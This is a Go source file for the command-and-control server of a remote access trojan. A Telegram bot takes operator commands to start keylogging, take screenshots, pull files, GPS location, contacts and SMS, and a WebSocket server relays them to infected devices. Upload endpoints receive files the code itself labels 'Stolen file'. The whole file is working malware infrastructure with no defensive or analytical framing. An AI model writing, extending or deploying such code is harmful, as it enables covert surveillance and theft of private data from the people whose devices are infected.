package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/gorilla/websocket"
)

var (
	token     = os.Getenv("TELEGRAM_TOKEN")
	chatIDStr = os.Getenv("CHAT_ID")
	clients   = make(map[*websocket.Conn]struct{})
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

var chatID int64

func main() {
	// Parse chatID once
	var err error
	chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil {
		log.Fatal("Invalid CHAT_ID:", err)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	// Start Telegram bot
	go startBot(ctx)

	// HTTP + WebSocket
	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/upload_chunked", chunkedHandler)
	http.HandleFunc("/ws", wsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}
	log.Printf("C2 live → https://%s.onrender.com", os.Getenv("RENDER_SERVICE_NAME"))
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func startBot(ctx context.Context) {
	b, err := bot.New(token)
	if err != nil {
		log.Fatal("Bot init failed:", err)
	}

	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, func(ctx context.Context, b *bot.Bot, update *models.Update) {
		if update.Message == nil || update.Message.Chat.ID != chatID {
			return
		}
		msg := strings.ToLower(update.Message.Text)

		switch {
		case msg == "/start":
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Available commands:\n/start_keylog - Start keylogging\n/stop_keylog - Stop keylogging\n/screenshot - Take screenshot\n/send_file /path/to/file - Exfil specific file\n/location - Get GPS location\n/contacts - Exfil contacts\n/sms - Exfil SMS\n/help - Show this menu"})
		case strings.Contains(msg, "start_keylog"):
			broadcastWS("start_keylog")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylog start command sent."})
		case strings.Contains(msg, "stop_keylog"):
			broadcastWS("stop_keylog")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylog stop command sent."})
		case strings.Contains(msg, "screenshot"):
			broadcastWS("screenshot")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent."})
		case strings.Contains(msg, "send_file"):
			// Extract path if provided after "send_file "
			parts := strings.Fields(msg)
			if len(parts) > 2 {
				path := strings.Join(parts[2:], " ")
				broadcastWS(fmt.Sprintf("send_file %s", path))
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("File exfil triggered for: %s", path)})
			} else {
				broadcastWS("send_file")
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Generic file exfil triggered."})
			}
		case strings.Contains(msg, "location"):
			broadcastWS("location")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Location request sent."})
		case strings.Contains(msg, "contacts"):
			broadcastWS("contacts")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Contacts exfil triggered."})
		case strings.Contains(msg, "sms"):
			broadcastWS("sms")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "SMS exfil triggered."})
		case strings.Contains(msg, "help") || msg == "/help":
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Available commands:\n/start_keylog\n/stop_keylog\n/screenshot\n/send_file [path]\n/location\n/contacts\n/sms\n/help"})
		default:
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown command. Type /help for options."})
		}
	})

	b.Start(ctx)
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]any{
		"base_url":          r.Host,
		"connected_devices": []string{},
		"status":            "running",
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}
	file, header, _ := r.FormFile("file")
	if file != nil {
		defer file.Close()
		data, _ := io.ReadAll(file)
		msg := fmt.Sprintf("Stolen file: %s (%dB)", header.Filename, len(data))
		log.Println(msg)
		sendMsg(msg)
	}
	w.Write([]byte("OK"))
}

func chunkedHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	data, _ := io.ReadAll(r.Body)
	msg := fmt.Sprintf("Chunked exfil: %dB", len(data))
	log.Println(msg)
	sendMsg(msg)
	w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, _ := upgrader.Upgrade(w, r, nil)
	clients[conn] = struct{}{}
	log.Println("RAT connected via WS")

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			delete(clients, conn)
			conn.Close()
			break
		}
		incoming := string(msg)
		log.Printf("RAT → %s", incoming)
		sendMsg("RAT: " + incoming)
	}
}

func broadcastWS(cmd string) {
	log.Printf("Broadcasting command: %s to %d clients", cmd, len(clients))
	for conn := range clients {
		if err := conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
			log.Printf("Failed to send to client: %v", err)
			delete(clients, conn)
		}
	}
}

func sendMsg(text string) {
	b, _ := bot.New(token)
	b.SendMessage(context.Background(), &bot.SendMessageParams{
		ChatID: chatID,
		Text:   text,
	})
}